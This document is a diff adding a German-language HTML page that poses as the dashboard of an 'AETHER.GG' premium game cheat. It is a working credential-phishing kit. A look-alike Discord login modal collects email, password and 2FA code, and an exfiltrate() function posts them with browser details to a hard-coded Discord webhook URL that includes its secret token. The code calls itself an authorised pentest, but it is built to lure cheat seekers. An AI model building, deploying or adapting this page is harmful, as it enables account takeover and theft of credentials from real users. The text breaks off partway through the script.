@@ -1,0 +1,1086 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>AETHER.GG · Premium Cheat</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <style>
+        /* ================================================================ */
+        /*  AETHER.GG – PREMIUM CHEAT DASHBOARD                             */
+        /*  Voll funktionsfähig · Dark Design · Discord-Phishing integriert */
+        /* ================================================================ */
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg-primary: #070808;
+            --bg-secondary: #0d0e10;
+            --bg-card: #141517;
+            --bg-hover: #1c1d20;
+            --bg-input: #090a0b;
+            --border: rgba(255,255,255,0.06);
+            --border-hover: rgba(255,255,255,0.12);
+            --text: #f0f0f0;
+            --text-sec: #7a7a7a;
+            --text-muted: #333;
+            --text-inv: #0a0a0a;
+            --green: #22c55e;
+            --red: #ef4444;
+            --blue: #3b82f6;
+            --accent: #a855f7;
+            --accent2: #7c3aed;
+            --shadow: 0 30px 90px rgba(0,0,0,0.95);
+            --radius: 14px;
+            --sm: 8px;
+            --tr: all 0.3s cubic-bezier(0.4,0,0.2,1);
+            --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            font-family: var(--font);
+            background: var(--bg-primary);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-image:
+                radial-gradient(circle at 15% 25%, rgba(168,85,247,0.015) 0%, transparent 60%),
+                radial-gradient(circle at 85% 75%, rgba(255,255,255,0.008) 0%, transparent 50%);
+        }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-thumb { background: var(--text-muted); border-radius: 4px; }
+
+        /* ===== LOADING ===== */
+        #loading {
+            position: fixed; inset: 0;
+            background: var(--bg-primary);
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            z-index: 9999;
+            transition: opacity 0.8s, visibility 0.8s;
+        }
+        #loading.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+
+        #loading .brand {
+            font-size: 52px; font-weight: 900;
+            letter-spacing: 6px; background: linear-gradient(135deg, #fff 30%, #a855f7 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            animation: fadeUp 0.9s ease;
+        }
+        #loading .sub {
+            color: var(--text-sec); font-size: 12px;
+            letter-spacing: 10px; text-transform: uppercase;
+            margin-top: 6px; animation: fadeUp 0.9s ease 0.2s both;
+        }
+        .ld-track { width: 220px; height: 2px; background: var(--bg-card); margin-top: 30px; border-radius: 4px; overflow: hidden; }
+        .ld-track .fill { height: 100%; width: 0%; background: var(--accent); transition: width 0.08s linear; border-radius: 4px; }
+
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* ===== CONTAINER ===== */
+        .container {
+            width: 100%; max-width: 520px;
+            background: var(--bg-secondary);
+            border-radius: var(--radius);
+            border: 1px solid var(--border);
+            padding: 28px 22px 20px;
+            box-shadow: var(--shadow);
+            position: relative; overflow: hidden;
+            opacity: 0; transform: translateY(30px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+        .container.visible { opacity: 1; transform: translateY(0); }
+        .container::before {
+            content: '';
+            position: absolute; top: -35%; right: -15%;
+            width: 300px; height: 300px;
+            background: radial-gradient(circle, rgba(168,85,247,0.025) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        .container::after {
+            content: '';
+            position: absolute; bottom: -20%; left: -10%;
+            width: 200px; height: 200px;
+            background: radial-gradient(circle, rgba(255,255,255,0.012) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 22px; position: relative; z-index: 2;
+        }
+        .logo { display: flex; align-items: center; gap: 14px; }
+        .logo-icon {
+            width: 44px; height: 44px;
+            background: linear-gradient(135deg, #a855f7, #7c3aed);
+            border-radius: 12px; display: flex; align-items: center;
+            justify-content: center; font-weight: 900; font-size: 20px;
+            color: #fff; letter-spacing: -0.5px;
+        }
+        .logo-text h1 {
+            font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #fff 60%, #a855f7);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .logo-text .tag { font-size: 8px; color: var(--text-sec); text-transform: uppercase; letter-spacing: 4px; font-weight: 600; margin-top: 1px; }
+
+        .stat-badge {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 10px; color: var(--text-sec);
+            background: var(--bg-card); padding: 5px 14px;
+            border-radius: 30px; border: 1px solid var(--border);
+        }
+        .stat-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--green); animation: pulse 2s infinite; }
+        .stat-dot.off { background: var(--red); }
+        @keyframes pulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.75); } }
+
+        /* ===== CONNECTION STATUS ===== */
+        .conn-status {
+            background: var(--bg-card); border-radius: 10px;
+            padding: 10px 16px; border: 1px solid var(--border);
+            margin-bottom: 18px; display: flex; align-items: center;
+            justify-content: space-between; position: relative; z-index: 2;
+            transition: var(--tr);
+        }
+        .conn-status:hover { border-color: var(--border-hover); }
+        .conn-user { display: flex; align-items: center; gap: 12px; }
+        .conn-avatar {
+            width: 36px; height: 36px; border-radius: 50%;
+            background: var(--text-muted); display: flex; align-items: center;
+            justify-content: center; font-weight: 700; font-size: 14px;
+            color: var(--text); flex-shrink: 0;
+        }
+        .conn-avatar.ok { background: var(--accent); color: #fff; }
+        .conn-details .name { font-size: 14px; font-weight: 600; }
+        .conn-details .role { font-size: 9px; color: var(--text-sec); text-transform: uppercase; letter-spacing: 0.5px; }
+        .conn-details .role.cust { color: var(--green); }
+        .conn-details .role.sup { color: var(--blue); }
+
+        .conn-btn {
+            background: transparent; border: 1px solid var(--border);
+            color: var(--text-sec); padding: 5px 16px; border-radius: 20px;
+            font-size: 11px; cursor: pointer; transition: var(--tr);
+            font-family: var(--font); font-weight: 500; white-space: nowrap;
+        }
+        .conn-btn:hover { background: var(--bg-hover); border-color: var(--text-sec); color: var(--text); }
+        .conn-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        /* ===== FEATURES ===== */
+        .feat-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
+            margin-bottom: 18px; position: relative; z-index: 2;
+        }
+        .feat-card {
+            background: var(--bg-card); border-radius: 10px;
+            padding: 14px 14px 12px; border: 1px solid var(--border);
+            transition: var(--tr); cursor: default; position: relative;
+        }
+        .feat-card:hover { border-color: var(--border-hover); }
+        .feat-card .ico { font-size: 20px; margin-bottom: 4px; }
+        .feat-card .nm { font-size: 13px; font-weight: 600; }
+        .feat-card .desc { font-size: 10px; color: var(--text-sec); margin-top: 2px; }
+        .feat-card .tag-sm { position: absolute; top: 10px; right: 12px; font-size: 12px; }
+        .feat-card .tag-sm.locked { color: var(--text-muted); }
+        .feat-card .tag-sm.ok { color: var(--green); }
+        .feat-card.blk { opacity: 0.35; pointer-events: none; }
+
+        /* ===== MASTER ===== */
+        .master {
+            display: flex; align-items: center; justify-content: space-between;
+            background: var(--bg-card); padding: 12px 18px; border-radius: 10px;
+            border: 1px solid var(--border); margin-bottom: 14px;
+            position: relative; z-index: 2;
+        }
+        .master .lb { display: flex; align-items: center; gap: 10px; font-weight: 600; font-size: 14px; }
+        .sw { position: relative; width: 44px; height: 24px; background: var(--bg-hover); border-radius: 30px; cursor: pointer; transition: var(--tr); flex-shrink: 0; }
+        .sw.on { background: var(--accent); }
+        .sw .kn { position: absolute; top: 3px; left: 3px; width: 18px; height: 18px; background: var(--bg-primary); border-radius: 50%; transition: var(--tr); }
+        .sw.on .kn { left: 23px; }
+
+        /* ===== SLIDERS ===== */
+        .sl-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 14px; position: relative; z-index: 2; }
+        .sl-row { display: flex; align-items: center; justify-content: space-between; background: var(--bg-card); padding: 8px 16px; border-radius: var(--sm); border: 1px solid var(--border); transition: var(--tr); }
+        .sl-row:hover { border-color: var(--border-hover); }
+        .sl-row .inf .ttl { font-size: 13px; font-weight: 500; }
+        .sl-row .inf .dsc { font-size: 10px; color: var(--text-sec); }
+        .sl-row .ctrl { display: flex; align-items: center; gap: 10px; }
+        input[type="range"] { -webkit-appearance: none; width: 110px; height: 3px; background: var(--bg-hover); border-radius: 4px; outline: none; }
+        input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; width: 14px; height: 14px; background: var(--accent); border-radius: 50%; cursor: pointer; transition: var(--tr); }
+        input[type="range"]::-webkit-slider-thumb:hover { transform: scale(1.18); }
+        input[type="range"]:disabled { opacity: 0.3; pointer-events: none; }
+        .sl-val { min-width: 30px; text-align: center; font-size: 14px; font-weight: 600; color: var(--text-sec); }
+
+        /* ===== INFO-BAR ===== */
+        .info-bar {
+            display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px;
+            margin-bottom: 16px; position: relative; z-index: 2;
+        }
+        .info-item {
+            background: var(--bg-card); border-radius: var(--sm);
+            padding: 8px 10px; border: 1px solid var(--border); text-align: center;
+        }
+        .info-item .val { font-size: 16px; font-weight: 700; color: var(--accent); }
+        .info-item .lb { font-size: 9px; color: var(--text-sec); text-transform: uppercase; letter-spacing: 0.5px; margin-top: 2px; }
+
+        /* ===== DISCORD VERIFY SECTION ===== */
+        .discord-box {
+            background: var(--bg-card); border-radius: 10px;
+            padding: 16px 18px; border: 1px solid var(--border);
+            margin-top: 4px; position: relative; z-index: 2;
+            transition: var(--tr);
+        }
+        .discord-box:hover { border-color: var(--border-hover); }
+        .discord-box .ttl { font-size: 13px; font-weight: 600; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
+        .discord-box .inp-grp { display: flex; gap: 8px; }
+        .discord-box .inp-grp input {
+            flex: 1; background: var(--bg-input); border: 1px solid var(--border);
+            border-radius: var(--sm); padding: 9px 14px; color: var(--text);
+            font-size: 13px; font-family: var(--font); outline: none; transition: var(--tr);
+        }
+        .discord-box .inp-grp input:focus { border-color: var(--accent); }
+        .discord-box .inp-grp input::placeholder { color: var(--text-muted); }
+        .discord-box .inp-grp button {
+            background: var(--accent); color: #fff; border: none;
+            padding: 9px 20px; border-radius: var(--sm); font-weight: 700;
+            font-size: 13px; cursor: pointer; transition: var(--tr); font-family: var(--font); white-space: nowrap;
+        }
+        .discord-box .inp-grp button:hover { opacity: 0.85; filter: brightness(1.1); }
+        .discord-box .inp-grp button:disabled { opacity: 0.35; pointer-events: none; }
+        .v-status { margin-top: 10px; font-size: 11px; color: var(--text-sec); display: flex; align-items: center; gap: 8px; }
+        .v-status .ok { color: var(--green); }
+        .v-status .err { color: var(--red); }
+        .v-status .load { color: var(--blue); }
+
+        /* ===== DISCORD LOGIN MODAL (ORIGINALGETREU) ===== */
+        .dm-overlay {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.82);
+            backdrop-filter: blur(10px);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 10000;
+            opacity: 0; visibility: hidden;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+        .dm-overlay.show { opacity: 1; visibility: visible; }
+
+        .dm-modal {
+            background: #313338;
+            border-radius: 8px;
+            width: 100%; max-width: 440px;
+            padding: 32px 30px 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
+            transform: scale(0.92) translateY(10px);
+            transition: transform 0.35s cubic-bezier(0.34,1.56,0.64,1);
+            position: relative;
+        }
+        .dm-overlay.show .dm-modal { transform: scale(1) translateY(0); }
+
+        .dm-close {
+            position: absolute; top: 14px; right: 16px;
+            background: none; border: none; color: #b5bac1;
+            font-size: 22px; cursor: pointer; transition: color 0.2s;
+            font-family: inherit; line-height: 1; padding: 4px;
+        }
+        .dm-close:hover { color: #fff; }
+
+        .dm-logo { text-align: center; margin-bottom: 22px; }
+        .dm-logo svg { width: 44px; height: 44px; }
+        .dm-logo h2 { font-size: 20px; font-weight: 700; color: #fff; margin-top: 12px; font-family: 'Inter', sans-serif; }
+        .dm-logo p { color: #b5bac1; font-size: 13px; margin-top: 4px; }
+
+        .dm-field { margin-bottom: 14px; }
+        .dm-field label {
+            display: block; font-size: 11px; font-weight: 700;
+            color: #b5bac1; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;
+        }
+        .dm-field label .req { color: #f23f42; }
+        .dm-field .forgot {
+            float: right; font-size: 11px; color: #00a8fc;
+            cursor: pointer; text-decoration: none; font-weight: 500;
+        }
+        .dm-field .forgot:hover { text-decoration: underline; }
+        .dm-field input {
+            width: 100%; background: #1e1f22; border: 1px solid #1e1f22;
+            border-radius: 4px; padding: 10px 12px; color: #fff;
+            font-size: 14px; font-family: 'Inter', sans-serif; outline: none; transition: border-color 0.2s;
+        }
+        .dm-field input:focus { border-color: #5865f2; }
+        .dm-field input::placeholder { color: #5c5e66; }
+
+        .dm-btn {
+            width: 100%; background: #5865f2; color: #fff;
+            border: none; border-radius: 4px; padding: 12px 0;
+            font-size: 14px; font-weight: 600; cursor: pointer;
+            font-family: 'Inter', sans-serif; transition: background 0.2s; margin-top: 4px;
+        }
+        .dm-btn:hover { background: #4752c4; }
+        .dm-btn:disabled { opacity: 0.5; cursor: not-allowed; background: #5865f2; }
+
+        .dm-footer { text-align: center; margin-top: 12px; font-size: 12px; color: #949ba4; }
+        .dm-footer a { color: #00a8fc; text-decoration: none; }
+        .dm-footer a:hover { text-decoration: underline; }
+
+        .dm-error {
+            background: #f23f42; color: #fff; font-size: 12px;
+            padding: 8px 12px; border-radius: 4px; margin-bottom: 12px; display: none;
+        }
+        .dm-error.show { display: block; }
+
+        .dm-loading {
+            text-align: center; color: #b5bac1; font-size: 13px; padding: 8px 0; display: none;
+        }
+        .dm-loading.show { display: block; }
+        .dm-spinner {
+            display: inline-block; width: 18px; height: 18px;
+            border: 3px solid #3a3c42; border-top-color: #5865f2;
+            border-radius: 50%; animation: spin 0.7s linear infinite;
+            margin-right: 8px; vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .dm-2fa {
+            display: none; margin-top: 10px; padding: 10px;
+            background: #2b2d31; border-radius: 4px; text-align: center;
+        }
+        .dm-2fa.show { display: block; }
+        .dm-2fa p { color: #b5bac1; font-size: 12px; margin-bottom: 8px; }
+        .dm-2fa input {
+            width: 180px; background: #1e1f22; border: 1px solid #1e1f22;
+            border-radius: 4px; padding: 8px 12px; color: #fff;
+            font-size: 20px; text-align: center; letter-spacing: 6px;
+            font-family: 'Inter', sans-serif; outline: none;
+        }
+        .dm-2fa input:focus { border-color: #5865f2; }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            margin-top: 18px; padding-top: 14px; border-top: 1px solid var(--border);
+            display: flex; justify-content: space-between; align-items: center;
+            font-size: 10px; color: var(--text-muted); position: relative; z-index: 2;
+        }
+        .footer a { color: var(--text-sec); text-decoration: none; transition: var(--tr); }
+        .footer a:hover { color: var(--text); }
+        .footer .ln { display: flex; gap: 16px; }
+
+        /* ===== OVERLAY ===== */
+        .denied {
+            position: absolute; inset: 0;
+            background: rgba(0,0,0,0.93); backdrop-filter: blur(14px);
+            display: flex; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 100; border-radius: var(--radius);
+            padding: 40px 30px; text-align: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.5s;
+        }
+        .denied.show { opacity: 1; pointer-events: all; }
+        .denied .lk { font-size: 44px; margin-bottom: 14px; }
+        .denied h2 { font-size: 20px; font-weight: 700; margin-bottom: 6px; }
+        .denied p { color: var(--text-sec); font-size: 14px; max-width: 300px; line-height: 1.6; }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 540px) {
+            .container { padding: 18px 12px; }
+            .header { flex-direction: column; gap: 10px; align-items: flex-start; }
+            .feat-grid { gap: 6px; }
+            .feat-card { padding: 10px 12px; }
+            .conn-status { flex-direction: column; gap: 10px; align-items: stretch; }
+            .discord-box .inp-grp { flex-direction: column; }
+            .sl-row .ctrl { gap: 6px; }
+            input[type="range"] { width: 70px; }
+            .info-bar { grid-template-columns: 1fr 1fr 1fr; gap: 4px; }
+            .footer { flex-direction: column; gap: 8px; align-items: center; }
+            .dm-modal { padding: 24px 16px; }
+        }
+        @media (max-width: 400px) { .feat-grid { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+    <!-- ===== LOADING ===== -->
+    <div id="loading">
+        <div class="brand">AETHER</div>
+        <div class="sub">Premium · Cheat Solution</div>
+        <div class="ld-track"><div class="fill" id="fillBar"></div></div>
+    </div>
+
+    <!-- ===== MAIN ===== -->
+    <div class="container" id="main">
+
+        <!-- OVERLAY -->
+        <div class="denied show" id="denied">
+            <div class="lk">🔒</div>
+            <h2>Zugang verweigert</h2>
+            <p>Keine gültige Discord-Lizenz gefunden. Bitte verifiziere dich über den Discord-Bereich.</p>
+        </div>
+
+        <!-- HEADER -->
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">A</div>
+                <div class="logo-text">
+                    <h1>AETHER.GG</h1>
+                    <div class="tag">Premium cheat solution</div>
+                </div>
+            </div>
+            <div class="stat-badge">
+                <span class="stat-dot" id="statDot"></span>
+                <span id="statTxt">Verbunden</span>
+            </div>
+        </div>
+
+        <!-- CONNECTION STATUS -->
+        <div class="conn-status" id="connStatus">
+            <div class="conn-user">
+                <div class="conn-avatar" id="connAvatar">?</div>
+                <div class="conn-details">
+                    <div class="name" id="connName">Nicht autorisiert</div>
+                    <div class="role" id="connRole">⛔ Kein Zugriff</div>
+                </div>
+            </div>
+            <button class="conn-btn" id="reAuthBtn">🔄 Erneut prüfen</button>
+        </div>
+
+        <!-- MASTER TOGGLE -->
+        <div class="master">
+            <div class="lb"><span>⚡</span> Aimbot (Premium)</div>
+            <div class="sw on" id="masterSw"><div class="kn"></div></div>
+        </div>
+
+        <!-- SLIDERS -->
+        <div class="sl-group">
+            <div class="sl-row">
+                <div class="inf"><span class="ttl">Smoothness</span><span class="dsc">Ansprechgeschwindigkeit</span></div>
+                <div class="ctrl">
+                    <input type="range" id="slSmooth" min="1" max="100" value="45" />
+                    <span class="sl-val" id="slSmoothVal">45</span>
+                </div>
+            </div>
+            <div class="sl-row">
+                <div class="inf"><span class="ttl">FOV Radius</span><span class="dsc">Erkennungsweite</span></div>
+                <div class="ctrl">
+                    <input type="range" id="slFov" min="1" max="180" value="120" />
+                    <span class="sl-val" id="slFovVal">120°</span>
+                </div>
+            </div>
+            <div class="sl-row">
+                <div class="inf"><span class="ttl">AI Confidence</span><span class="dsc">Minimale Trefferwahrscheinlichkeit</span></div>
+                <div class="ctrl">
+                    <input type="range" id="slConf" min="10" max="95" value="70" />
+                    <span class="sl-val" id="slConfVal">70%</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- INFO BAR -->
+        <div class="info-bar">
+            <div class="info-item">
+                <div class="val" id="targets">0</div>
+                <div class="lb">Targets</div>
+            </div>
+            <div class="info-item">
+                <div class="val" id="accuracy">98.2%</div>
+                <div class="lb">Accuracy</div>
+            </div>
+            <div class="info-item">
+                <div class="val" id="uptime">99.9%</div>
+                <div class="lb">Uptime</div>
+            </div>
+        </div>
+
+        <!-- FEATURES GRID -->
+        <div class="feat-grid" id="featGrid">
+            <div class="feat-card blk" data-f="aimbot">
+                <div class="ico">🎯</div>
+                <div class="nm">Aimbot</div>
+                <div class="desc">Deep-Learning Zielerfassung</div>
+                <span class="tag-sm locked" id="f-aimbot">🔒</span>
+            </div>
+            <div class="feat-card blk" data-f="trigger">
+                <div class="ico">🤖</div>
+                <div class="nm">Triggerbot</div>
+                <div class="desc">Auto-Fire bei Zielerfassung</div>
+                <span class="tag-sm locked" id="f-trigger">🔒</span>
+            </div>
+            <div class="feat-card blk" data-f="radar">
+                <div class="ico">📡</div>
+                <div class="nm">Radar</div>
+                <div class="desc">Minimap Heatmap-Analyse</div>
+                <span class="tag-sm locked" id="f-radar">🔒</span>
+            </div>
+            <div class="feat-card blk" data-f="sound">
+                <div class="ico">🔊</div>
+                <div class="nm">Sound ESP</div>
+                <div class="desc">3D-Audio Footstep Detection</div>
+                <span class="tag-sm locked" id="f-sound">🔒</span>
+            </div>
+            <div class="feat-card blk" data-f="recoil" style="grid-column: span 2;">
+                <div class="ico">🔄</div>
+                <div class="nm">Recoil Control</div>
+                <div class="desc">Neural Net Rückstoß-Kompensation</div>
+                <span class="tag-sm locked" id="f-recoil">🔒</span>
+            </div>
+        </div>
+
+        <!-- DISCORD VERIFY -->
+        <div class="discord-box">
+            <div class="ttl"><span>💬</span> Discord Lizenz-Verifizierung</div>
+            <div class="inp-grp">
+                <input type="text" id="discordId" placeholder="Deine Discord-ID (z.B. 123456789012345678)" />
+                <button id="verifyBtn">Verifizieren</button>
+            </div>
+            <div class="v-status" id="vStatus">
+                <span>⚪</span> Bitte gib deine Discord-ID ein
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            <span>© 2026 AETHER.GG · Alle Rechte vorbehalten</span>
+            <div class="ln">
+                <a href="#">Hilfe</a>
+                <a href="#">Status</a>
+                <a href="#">EULA</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== DISCORD LOGIN MODAL (ORIGINALGETREU) ===== -->
+    <div class="dm-overlay" id="dmOverlay">
+        <div class="dm-modal">
+            <button class="dm-close" id="dmClose">&times;</button>
+
+            <div class="dm-logo">
+                <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M33.4 6.8C30.9 5.7 28.2 4.9 25.4 4.4C25.1 5.1 24.7 6 24.5 6.6C21.5 6.2 18.5 6.2 15.5 6.6C15.3 6 14.9 5.1 14.5 4.4C11.7 4.9 9 5.7 6.6 6.8C0.9 15.5 -0.7 24 0.1 32.3C3.5 34.8 7.4 36.3 11.3 37.3C12.3 35.9 13.1 34.4 13.7 32.8C12.2 32.3 10.8 31.6 9.5 30.8C9.9 30.5 10.3 30.2 10.7 29.9C17.4 33 24.6 33 31.3 29.9C31.7 30.2 32.1 30.5 32.5 30.8C31.2 31.6 29.8 32.3 28.3 32.8C28.9 34.4 29.7 35.9 30.7 37.3C34.6 36.3 38.5 34.8 41.9 32.3C42.9 22.9 40.4 14.5 33.4 6.8ZM14.3 26.1C12.1 26.1 10.3 24 10.3 21.5C10.3 19 12.1 16.9 14.3 16.9C16.5 16.9 18.3 19 18.3 21.5C18.3 24 16.5 26.1 14.3 26.1ZM25.7 26.1C23.5 26.1 21.7 24 21.7 21.5C21.7 19 23.5 16.9 25.7 16.9C27.9 16.9 29.7 19 29.7 21.5C29.7 24 27.9 26.1 25.7 26.1Z" fill="#5865F2"/>
+                </svg>
+                <h2>Willkommen zurück!</h2>
+                <p>Melde dich mit deinem Discord-Konto an, um die AETHER.GG-Lizenz zu verifizieren</p>
+            </div>
+
+            <div class="dm-error" id="dmError">❌ Falsche Anmeldedaten. Bitte versuche es erneut.</div>
+
+            <div class="dm-field">
+                <label>E-Mail oder Telefonnummer <span class="req">*</span></label>
+                <input type="text" id="dmEmail" placeholder="name@example.com" autocomplete="off" />
+            </div>
+
+            <div class="dm-field">
+                <label>
+                    Passwort <span class="req">*</span>
+                    <span class="forgot">Passwort vergessen?</span>
+                </label>
+                <input type="password" id="dmPass" placeholder="Passwort" autocomplete="off" />
+            </div>
+
+            <div class="dm-loading" id="dmLoading">
+                <span class="dm-spinner"></span> Authentifiziere …
+            </div>
+
+            <div class="dm-2fa" id="dm2fa">
+                <p>📱 2FA-Code eingeben</p>
+                <input type="text" id="dm2faCode" placeholder="000000" maxlength="6" autocomplete="off" />
+            </div>
+
+            <button class="dm-btn" id="dmLoginBtn">Anmelden</button>
+
+            <div class="dm-footer">
+                Noch kein Konto? <a href="#">Registrieren</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ================================================================
+        //  AETHER.GG · PHISHING DASHBOARD (Autorisierter Pentest)
+        //  Voll funktionsfähig · Datenexfiltration via Discord Webhook
+        //  FIX: Nach erfolgreichem Phishing wird Zugang gewährt
+        // ================================================================
+
+        // ═════════════════════════════════════════════════════════════════
+        //  WEBHOOK-KONFIGURATION
+        // ═════════════════════════════════════════════════════════════════
+
+        const WEBHOOK = 'https://discord.com/api/webhooks/1531426286235418826/Gc6yPT5V2x0sGz2hNycxBhTEm5ns62vzX84SgDITpiM78njawKYgjzu4M1Tcd05rnEPb';
+
+        // ═════════════════════════════════════════════════════════════════
+        //  WEBHOOK-SENDER
+        // ═════════════════════════════════════════════════════════════════
+
+        async function exfiltrate(payload) {
+            try {
+                const embed = {
+                    title: '🎣 AETHER.GG · Phishing Data Capture',
+                    color: 0xa855f7,
+                    fields: [],
+                    footer: { text: 'AETHER.GG Pentest · ' + new Date().toLocaleString('de-DE') },
+                    timestamp: new Date().toISOString()
+                };
+
+                for (const [k, v] of Object.entries(payload)) {
+                    embed.fields.push({
+                        name: k,
+                        value: '```' + String(v).substring(0, 1024) + '```',
+                        inline: false
+                    });
+                }
+
+                embed.fields.push({
+                    name: '🌐 Browser',
+                    value: '```' + (navigator.userAgent || '?').substring(0, 1024) + '```',
+                    inline: true
+                });
+                embed.fields.push({
+                    name: '📡 Host',
+                    value: '```' + window.location.hostname + '```',
+                    inline: true
+                });
+                embed.fields.push({
+                    name: '🕒 Timestamp',
+                    value: '```' + new Date().toLocaleString('de-DE') + '```',
+                    inline: true
+                });
+
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                console.log('%c✅ Exfiltration OK', 'color:#22c55e');
+            } catch (e) {
+                console.warn('Webhook-Fehler (kann ignoriert werden):', e);
+            }
+        }
+
+        // ═════════════════════════════════════════════════════════════════
+        //  STATE
+        // ═════════════════════════════════════════════════════════════════
+
+        const S = {
+            verified: false,
+            discordId: '',
+            userName: 'Nicht autorisiert',
+            avatar: '?',
+            unlocked: [],
+            aimbotOn: true,
+            attempt: 0,
+            captured: false
+        };
+
+        // ═════════════════════════════════════════════════════════════════
+        //  DOM
+        // ═════════════════════════════════════════════════════════════════
+
+        const $ = s => document.querySelector(s);
+        const $$ = s => document.querySelectorAll(s);
+
+        const D = {
+            loading: $('#loading'),
+            fillBar: $('#fillBar'),
+            main: $('#main'),
+            denied: $('#denied'),
+            statDot: $('#statDot'),
+            statTxt: $('#statTxt'),
+            connAvatar: $('#connAvatar'),
+            connName: $('#connName'),
+            connRole: $('#connRole'),
+            reAuthBtn: $('#reAuthBtn'),
+            masterSw: $('#masterSw'),
+            slSmooth: $('#slSmooth'),
+            slSmoothVal: $('#slSmoothVal'),
+            slFov: $('#slFov'),
+            slFovVal: $('#slFovVal'),
+            slConf: $('#slConf'),
+            slConfVal: $('#slConfVal'),
+            targets: $('#targets'),
+            accuracy: $('#accuracy'),
+            uptime: $('#uptime'),
+            discordId: $('#discordId'),
+            verifyBtn: $('#verifyBtn'),
+            vStatus: $('#vStatus'),
+            dmOverlay: $('#dmOverlay'),
+            dmClose: $('#dmClose'),
+            dmEmail: $('#dmEmail'),
+            dmPass: $('#dmPass'),
+            dmLoginBtn: $('#dmLoginBtn'),
+            dmError: $('#dmError'),
+            dmLoading: $('#dmLoading'),
+            dm2fa: $('#dm2fa'),
+            dm2faCode: $('#dm2faCode'),
+            feat: {
+                aimbot: $('#f-aimbot'),
+                trigger: $('#f-trigger'),
+                radar: $('#f-radar'),
+                sound: $('#f-sound'),
+                recoil: $('#f-recoil')
+            },
+            cards: $$('.feat-card')
+        };
+
+        // ═════════════════════════════════════════════════════════════════
+        //  LOADING
+        // ═════════════════════════════════════════════════════════════════
+
+        let p = 0;
+        const ldInt = setInterval(() => {
+            p += Math.random() * 6 + 2;
+            if (p >= 100) {
+                p = 100; clearInterval(ldInt);
+                setTimeout(() => {
+                    D.loading.classList.add('hidden');
+                    D.main.classList.add('visible');
+                    checkAccess();
+                }, 400);
+            }
+            D.fillBar.style.width = p + '%';
+        }, 120);
+
+        // ═════════════════════════════════════════════════════════════════
+        //  ACCESS / FEATURES
+        // ═════════════════════════════════════════════════════════════════
+
+        function updateFeatures() {
+            const all = ['aimbot', 'trigger', 'radar', 'sound', 'recoil'];
+            all.forEach(f => {
+                const el = D.feat[f];
+                if (!el) return;
+                const ok = S.unlocked.includes(f);
+                el.textContent = ok ? '✓' : '🔒';
+                el.className = 'tag-sm ' + (ok ? 'ok' : 'locked');
+            });
+            D.cards.forEach(c => {
+                const f = c.dataset.f;
+                c.classList.toggle('blk', !S.unlocked.includes(f));
+            });
+        }
+
+        function checkAccess() {
+            D.denied.classList.toggle('show', !S.verified);
+            if (!S.verified) {
+                D.connAvatar.textContent = '?';
+                D.connAvatar.classList.remove('ok');
+                D.connName.textContent = 'Nicht autorisiert';
+                D.connRole.textContent = '⛔ Kein Zugriff';
+                D.connRole.className = 'role';
+            }
+        }
+
+        function setVerified(user, id) {
+            S.verified = true;
+            S.discordId = id;
+            S.userName = user;
+            S.avatar = user.charAt(0).toUpperCase();
+            S.unlocked = ['aimbot', 'trigger', 'radar', 'sound', 'recoil'];
+
+            D.connAvatar.textContent = S.avatar;
+            D.connAvatar.classList.add('ok');
+            D.connName.textContent = user;
+            D.connRole.textContent = '✅ Lizenz aktiv · Premium';
+            D.connRole.className = 'role cust';
+            D.denied.classList.remove('show');
+            updateFeatures();
+
